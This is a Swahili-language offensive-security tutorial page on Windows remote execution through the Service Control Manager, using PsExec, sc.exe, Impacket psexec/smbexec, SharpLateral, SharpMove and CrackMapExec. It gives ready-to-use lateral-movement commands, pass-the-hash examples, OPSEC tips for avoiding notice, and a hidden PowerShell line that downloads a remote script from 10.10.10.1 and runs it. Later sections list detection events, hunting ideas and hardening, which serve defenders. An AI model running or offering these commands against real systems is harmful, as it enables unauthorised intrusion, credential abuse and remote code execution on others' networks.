# Utekelezaji wa Huduma wa Mbali (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Hufanyaje kazi

Mbinu hizi hutumia vibaya Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza amri kwenye host lengwa. Service Control Manager Remote Protocol (SCMR) ni kiolesura kinachotumia RPC kwa ajili ya kusanidi na kudhibiti huduma za Windows kwenye kompyuta ya mbali. Kwa ruhusa za kutosha, operator anaweza kuunda upya au kusanidi huduma ambayo njia yake ya binary ina amri, kisha aanzishe huduma hiyo ili kutekeleza amri hiyo kwa mbali.<sup>[[5]](#references)</sup> Mtiririko wa kawaida ni:

1. Thibitisha utambulisho kwenye target kupitia SMB/RPC (TCP/445); fikia share ya ADMIN$ ikiwa variant iliyochaguliwa inahitaji kuweka faili au kupata matokeo hapo.
2. Nakili executable au bainisha command line ya LOLBAS ambayo huduma itatekeleza.
3. Unda huduma kwa mbali kupitia SCM (MS-SCMR over \PIPE\svcctl) inayoelekeza kwenye amri au binary hiyo.
4. Anzisha huduma ili kutekeleza payload na, kwa hiari, kunasa stdin/stdout kupitia named pipe.
5. Simamisha huduma na ufanye usafishaji (futa huduma na binary zozote zilizowekwa).

Mahitaji/vigezo vya awali:
- Local Administrator kwenye target (SeCreateServicePrivilege) au ruhusa za wazi za kuunda huduma kwenye target.
- SMB (445) iweze kufikiwa na Remote Service Management iruhusiwe kupitia firewall ya host; ADMIN$ lazima ipatikane kwa variants zinazotumia kuweka faili au kupata matokeo.
- UAC Remote Restrictions: kwa kutumia akaunti za local, uchujaji wa token unaweza kuzuia admin kuingia kupitia mtandao, isipokuwa ukitumia akaunti ya Administrator iliyojengewa ndani au LocalAccountTokenFilterPolicy=1.
- Kerberos dhidi ya NTLM: kutumia hostname/FQDN huwezesha Kerberos; kuunganisha kwa IP mara nyingi hurudi kutumia NTLM (na kunaweza kuzuiwa katika mazingira yaliyofanyiwa hardening).

Ikiwa akaunti ya huduma haijabainishwa, `CreateService` hutumia `LocalSystem`, ambayo ina ruhusa nyingi za local. Hii inaeleza athari kubwa ya utekelezaji wa SCM uliofanikiwa. Hii haizimi UAC au Microsoft Defender yenyewe: mpigaji bado anahitaji ruhusa za SCM za mbali, na vidhibiti vya endpoint vinaweza kukagua au kuzuia huduma au payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec ya Mwongozo kupitia sc.exe

Ifuatayo inaonyesha mbinu ya msingi ya kuunda huduma. Image ya huduma inaweza kuwa EXE iliyowekwa au LOLBAS kama cmd.exe au powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Maelezo:
- Tarajia hitilafu ya timeout unapoanzisha EXE isiyo service; utekelezaji bado hutokea.
- Ili kubaki OPSEC-friendly zaidi, pendelea amri zisizo na faili (cmd /c, powershell -enc) au ufute artifacts zilizodondoshwa.

Pata hatua za kina zaidi hapa: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Zana na mifano

### Sysinternals PsExec.exe

- Zana ya kawaida ya admin inayotumia SMB kudondosha PSEXESVC.exe kwenye ADMIN$, kusakinisha service ya muda (jina chaguomsingi PSEXESVC), na kupeleka I/O kupitia named pipes.
- Mifano ya matumizi:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Unaweza kuzindua moja kwa moja kupitia WebDAV kutoka Sysinternals Live:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Huacha matukio ya kusakinisha/kuondoa service (jina la service mara nyingi ni PSEXESVC isipokuwa -r itumike) na huunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.

### Impacket psexec.py (inafanana na PsExec)

- Hutumia service iliyopachikwa inayofanana na RemCom. Huacha binary ya service ya muda (mara nyingi yenye jina nasibu) kupitia ADMIN$, huunda service (kwa kawaida RemComSvc) na kuelekeza I/O kupitia named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Kwenye Kali, mifano ya Impacket inaweza kupatikana katika `/usr/share/doc/python3-impacket/examples/`. Ikiwa hakuna nenosiri lililotolewa, zana huomba uweke moja. `-k` ya Impacket huomba uthibitishaji wa Kerberos badala ya NTLM, kwa kawaida ikitumia akiba ya sasa ya vitambulisho au vitambulisho vilivyotolewa.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Mabaki
- EXE ya muda katika C:\Windows\ (herufi nasibu 8). Jina la service kwa chaguomsingi ni RemComSvc, isipokuwa libadilishwe.

### Impacket smbexec.py (SMBExec)

- Huunda service ya muda inayozindua cmd.exe na kutumia named pipe kwa I/O. Kwa kawaida huepuka kuweka payload kamili ya EXE kwenye diski; utekelezaji wa amri huwa wa mwingiliano kwa kiasi.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) hutekeleza mbinu kadhaa za lateral movement, ikiwemo exec inayotegemea huduma.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) inaunga mkono utekelezaji wa mbali unaotumia uthibitishaji kupitia SCM na mbinu nyingine kadhaa za Windows, ikiwemo kurekebisha/kuunda huduma.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Unaweza pia kutumia CrackMapExec kutekeleza kupitia backends tofauti (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

Kitendo cha SCM huunda huduma inayoitwa `WindowsDebug` na kuielekeza kwenye payload ambayo tayari ipo kwenye hosti ya mbali.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, ugunduzi na mabaki

Mabaki ya kawaida kwenye host/network unapotumia mbinu zinazofanana na PsExec:
- Security 4624 (Logon Type 3) na 4672 (Special Privileges) kwenye target, kwa akaunti ya admin iliyotumika.
- Security 5140/5145 File Share na File Share Detailed events zinazoonyesha ufikiaji wa ADMIN$ na uundaji/uandikaji wa service binaries (kwa mfano, PSEXESVC.exe au .exe ya herufi 8 isiyojulikana).
- **System** 7045 kutoka Service Control Manager inayoonyesha usakinishaji wa service kwenye target: majina kama PSEXESVC, RemComSvc, au custom (`-r` / `-service-name`). Hii inathibitisha kuwa service ilisakinishwa, si kwamba image yake ilitekelezwa. Linganisha timestamp na image path yake na process events au service-image prefetch entry inayolingana, inapopatikana.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) kwa services.exe au service image, 3 (Network Connect), 11 (File Create) ndani ya C:\Windows\, na 17/18 (Pipe Created/Connected) kwa pipes kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au zinazofanana zenye majina nasibu.
- Mabaki ya Registry ya Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye host ya operator (ikiwa hayakuzimwa).

Mawazo ya kutafuta
- Toa tahadhari kwa usakinishaji wa service ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au maeneo ya TEMP.
- Tafuta uundaji wa process ambapo ParentImage ni C:\Windows\PSEXESVC.exe au process zilizo chini ya services.exe zinazotumia LOCAL SYSTEM kutekeleza shells.
- Weka alama kwa named pipes zinazoishia na -stdin/-stdout/-stderr au majina ya pipe yanayotambulika ya PsExec clone.

## Kutatua matatizo ya kawaida
- Access is denied (5) wakati wa kuunda services: huenda akaunti si local admin kweli, kuna vizuizi vya UAC remote kwa akaunti za local, au EDR inazuia mabadiliko kwenye service binary path.
- The network path was not found (53) au imeshindwa kuunganisha kwenye ADMIN$: firewall inazuia SMB/RPC au admin shares zimezimwa.
- Kerberos inashindwa lakini NTLM imezuiwa: unganisha kwa kutumia hostname/FQDN (si IP), hakikisha SPNs ziko sahihi, au toa -k/-no-pass pamoja na tickets unapotumia Impacket.
- Muda wa kuanzisha service unaisha lakini payload ilitekelezwa: hili linatarajiwa ikiwa si service binary halisi; hifadhi matokeo kwenye faili au tumia smbexec kwa I/O ya moja kwa moja.

## Vidokezo vya kuimarisha usalama
- Windows 11 24H2 na Windows Server 2025 huhitaji SMB signing kwa chaguomsingi kwa miunganisho ya outbound (na miunganisho ya inbound ya Windows 11). Hili halizuii matumizi halali ya PsExec yenye creds halali, lakini huzuia matumizi mabaya ya SMB relay isiyosainiwa na linaweza kuathiri vifaa visivyotumia signing.<sup>[[2]](#references)</sup>
- Uzuiaji mpya wa NTLM wa SMB client (Windows 11 24H2/Server 2025) unaweza kuzuia fallback ya NTLM unapounganisha kwa kutumia IP au kwenye servers zisizotumia Kerberos. Katika mazingira yaliyoimarishwa, hili litazuia PsExec/SMBExec inayotegemea NTLM; tumia Kerberos (hostname/FQDN) au sanidi exceptions ikiwa inahitajika kihalali.<sup>[[2]](#references)</sup>
- Kanuni ya ruhusa za kiwango cha chini zaidi: punguza uanachama wa local admin, pendelea Just-in-Time/Just-Enough Admin, tekeleza LAPS, na fuatilia/toa tahadhari kuhusu usakinishaji wa service wa 7045.

## Tazama pia

- Utekelezaji wa mbali unaotegemea WMI (mara nyingi hauachi faili):

{{#ref}}
./wmiexec.md
{{#endref}}

- Utekelezaji wa mbali unaotegemea WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Kuimarisha usalama wa SMB katika Windows Server 2025 na Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Kutumia Credentials Kumiliki Windows Boxes - Sehemu ya 2 (PSExec na Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Kutatua tatizo la kuwashwa upya kusikotarajiwa kwa kutumia system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Muhtasari wa Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Akaunti ya LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Function ya `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
